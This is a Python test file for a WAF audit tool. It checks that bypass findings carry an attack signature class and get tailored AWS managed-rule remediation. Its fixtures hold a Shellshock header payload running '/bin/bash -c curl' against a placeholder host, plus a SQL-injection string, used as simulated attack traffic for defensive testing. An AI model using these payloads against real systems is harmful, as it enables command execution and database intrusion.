"""Fix #34 — bypass_candidate findings now render account-specific
smart remediation.

Root cause: Pass 3 (`detect_bypasses`) emits bypass findings without
a `signature_class` field. The downstream smart-remediation layer
(`smart_remediation_for` → `_smart_bypass`) reads `signature_class`
to pick the target AWS managed rule group (Unix / KnownBadInputs /
SQLi / etc.). Without it, the smart layer returns None and the
finding falls back to canned generic copy.

These tests pin the post-fix behaviour: the audit pipeline now
populates `signature_class` on every bypass_candidate finding using
the highest-frequency `_signature_classes` tag across the
suspicious-request sample scoped to the finding's ACL(s).
"""
from __future__ import annotations

import os
import sys
from pathlib import Path

BACKEND_DIR = Path(__file__).resolve().parent.parent
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

os.environ["EDGEPOSTURE_TESTING"] = "1"
os.environ.setdefault("EXTERNAL_ID_SECRET", "a" * 64)

import mongomock

from services import audit as audit_mod
from services import db as db_mod


# --- Fixture helpers ------------------------------------------------------


_ACL_NAME = "ruleiq-test-acl-cf"  # mirrors the production ACL in #34.


def _shellshock_request(uri: str = "/cgi-bin/test.cgi") -> dict:
    """A suspicious-request entry shaped the way the bypass sampler
    emits it: pre-tagged with `_signature_classes` and `_web_acl_name`
    by the audit pipeline's signature-class enricher."""
    return {
        "httpRequest": {
            "uri": uri,
            "args": "cmd=%28%29+%7B+%3A%3B+%7D%3B+%2Fbin%2Fsh",
            "headers": [
                {"name": "User-Agent",
                 "value": "() { :;}; /bin/bash -c 'curl http://x'"},
            ],
        },
        "action": "ALLOW",
        "responseCodeSent": 200,
        "_web_acl_name": _ACL_NAME,
        "_signature_classes": ["shellshock"],
        "_suspicion_score": 0.95,
    }


def _audit_setup(monkeypatch, db_name: str, suspicious: list,
                 emit_bypass: bool = True):
    """Wire up the audit pipeline with a minimal customer rule set
    (one custom rule on `_ACL_NAME`), a tunable suspicious-request
    list, and either a bypass-only or empty Pass-3 emission."""
    db = mongomock.MongoClient()[db_name]
    db_mod.set_test_db(db)

    rule = {
        "rule_name": "BlockBadIPs", "web_acl_name": _ACL_NAME,
        "priority": 10, "action": "BLOCK", "rule_kind": "custom",
        "statement_json": {}, "hit_count": 7, "count_mode_hits": 0,
        "last_fired": "2026-04-15T10:00:00Z", "sample_uris": [],
        "fms_managed": False, "override_action": None,
        "managed_rule_overrides": [],
    }

    def fake_load(*_a, **_kw):
        return [rule], {
            "data_source": "fixture", "fms_visibility": None,
            "logging_available": True, "web_acl_count": 1,
            "web_acls": [{
                "name": _ACL_NAME, "scope": "CLOUDFRONT", "arn": None,
                "attached_resources": [{
                    "arn": "arn:aws:cloudfront::123456789012:distribution/E1",
                    "type": "CLOUDFRONT_DISTRIBUTION",
                    "id": "E1", "friendly": "E1",
                }],
                "attached": True,
            }],
            "orphan_acl_names": set(),
            "suspicious_requests": suspicious,
        }
    monkeypatch.setattr(audit_mod, "_load_rules_from_fixtures", fake_load)
    monkeypatch.setenv("DEMO_MODE", "true")

    findings: list = []
    if emit_bypass:
        findings.append({
            "type": "bypass_candidate", "severity": "high",
            "title": "Possible WAF bypass: shellshock reached origin",
            "description": "Shellshock-shaped request answered 2xx.",
            "recommendation": "Add an AWS managed group covering CVE-2014-6271.",
            # Pass 3 in production emits these with affected_rules
            # already set by Phase 5.3.2; we replicate that here so
            # the test exercises the signature_class-only gap.
            "affected_rules": [_ACL_NAME],
            "confidence": 0.95,
            "evidence": "log-sample",
        })

    monkeypatch.setattr(
        audit_mod.ai_pipeline, "run_pipeline",
        lambda rules, **_kw: {
            "rules": [
                {**r, "ai_explanation": {"explanation": "m", "working": True,
                                          "concerns": None}}
                for r in rules
            ],
            "findings": findings,
        },
    )

    audit_id = audit_mod.create_audit_run(
        db=db, account_id="123456789012", role_arn=None,
        region="us-east-1", log_window_days=30, external_id=None,
    )
    audit_mod.run_audit_pipeline(audit_id, db)
    return db, audit_id


# --- Tests ----------------------------------------------------------------


def test_bypass_finding_has_signature_class(monkeypatch):
    """Every emitted `bypass_candidate` must carry a non-None
    `signature_class` string whenever the suspicious-request sample
    has at least one `_signature_classes` tag matching the finding's
    ACL scope. Pinned to catch the regression where Pass 3 emits
    bypass findings without propagating which attack class triggered
    them."""
    db, _aid = _audit_setup(
        monkeypatch, "ruleiq_fix34_has_class",
        suspicious=[
            _shellshock_request("/cgi-bin/a"),
            _shellshock_request("/cgi-bin/b"),
        ],
    )
    bypass = next(
        f for f in db["findings"].find({"type": "bypass_candidate"})
    )
    assert bypass["signature_class"] == "shellshock", (
        "bypass finding must inherit signature_class from its "
        "suspicious-request sample. Got: "
        f"{bypass.get('signature_class')!r}"
    )


def test_smart_remediation_fires_for_bypass_with_signature_class(monkeypatch):
    """End-to-end: shellshock signature in the suspicious sample →
    persisted bypass finding has `remediation_kind == 'smart'`, the
    suggested_actions cite `AWSManagedRulesUnixRuleSet` AND the ACL
    name, a priority slot is named, and `evidence_samples` carries
    2-3 example URIs."""
    db, _aid = _audit_setup(
        monkeypatch, "ruleiq_fix34_smart_fires",
        suspicious=[
            _shellshock_request("/cgi-bin/test.cgi"),
            _shellshock_request("/cgi-bin/admin.cgi"),
            _shellshock_request("/cgi-bin/login.cgi"),
        ],
    )
    bypass = next(
        f for f in db["findings"].find({"type": "bypass_candidate"})
    )

    assert bypass["remediation_kind"] == "smart", (
        f"expected smart remediation; got "
        f"{bypass.get('remediation_kind')!r}. signature_class="
        f"{bypass.get('signature_class')!r}"
    )
    action = " ".join(bypass["suggested_actions"])
    assert "AWSManagedRulesUnixRuleSet" in action, (
        "smart action must name the target AWS managed rule group "
        f"for shellshock. Got: {action!r}"
    )
    assert _ACL_NAME in action, (
        f"smart action must cite the affected ACL by name. "
        f"Got: {action!r}"
    )
    # Console nav path mentions WAFv2 → Web ACLs → <acl> → Rules.
    assert "WAFv2 → Web ACLs → " + _ACL_NAME in action
    # A numeric priority slot — `priority N` somewhere in the copy.
    import re
    assert re.search(r"priority\s+\d+", action), (
        f"smart action must propose a priority slot. Got: {action!r}"
    )
    # Evidence — at least 1, at most 3 sample URIs.
    samples = bypass.get("evidence_samples") or []
    assert 1 <= len(samples) <= 3, (
        f"evidence_samples must hold 1-3 URIs; got {len(samples)}: "
        f"{samples!r}"
    )
    # The samples are the actual matched URIs from the suspicious feed.
    assert any("/cgi-bin/" in s for s in samples)


def test_smart_remediation_falls_back_when_signature_class_missing(monkeypatch):
    """When the suspicious-request sample carries NO
    `_signature_classes` tags (legacy audits, or sampler hasn't been
    upgraded), the bypass finding must not crash, must leave
    `signature_class=None`, and must fall back to `remediation_kind ==
    'canned'`."""
    untagged = {
        "httpRequest": {"uri": "/x", "args": "", "headers": []},
        "action": "ALLOW",
        "responseCodeSent": 200,
        "_web_acl_name": _ACL_NAME,
        # NB: no _signature_classes — the regression case.
        "_suspicion_score": 0.6,
    }
    db, _aid = _audit_setup(
        monkeypatch, "ruleiq_fix34_fallback",
        suspicious=[untagged, untagged],
    )
    bypass = next(
        f for f in db["findings"].find({"type": "bypass_candidate"})
    )
    assert bypass.get("signature_class") is None
    assert bypass["remediation_kind"] == "canned", (
        f"expected canned fallback; got "
        f"{bypass.get('remediation_kind')!r}"
    )
    # Canned bypass remediation must still emit non-empty
    # suggested_actions — the user gets generic guidance, not silence.
    assert bypass["suggested_actions"], (
        "canned fallback must still produce suggested_actions"
    )


def test_signature_class_picks_highest_frequency(monkeypatch):
    """When suspicious sample carries a mix of `_signature_classes`,
    the most-frequent class wins. Pin: 3 shellshock + 1 sqli →
    signature_class == 'shellshock' (which routes to Unix rule set).
    """
    sql_req = {
        "httpRequest": {"uri": "/api", "args": "id=1' OR '1'='1",
                         "headers": []},
        "action": "ALLOW", "responseCodeSent": 200,
        "_web_acl_name": _ACL_NAME,
        "_signature_classes": ["sqli"],
        "_suspicion_score": 0.8,
    }
    db, _aid = _audit_setup(
        monkeypatch, "ruleiq_fix34_topclass",
        suspicious=[
            _shellshock_request("/a"),
            _shellshock_request("/b"),
            _shellshock_request("/c"),
            sql_req,
        ],
    )
    bypass = next(
        f for f in db["findings"].find({"type": "bypass_candidate"})
    )
    assert bypass["signature_class"] == "shellshock"
    action = " ".join(bypass["suggested_actions"])
    assert "AWSManagedRulesUnixRuleSet" in action
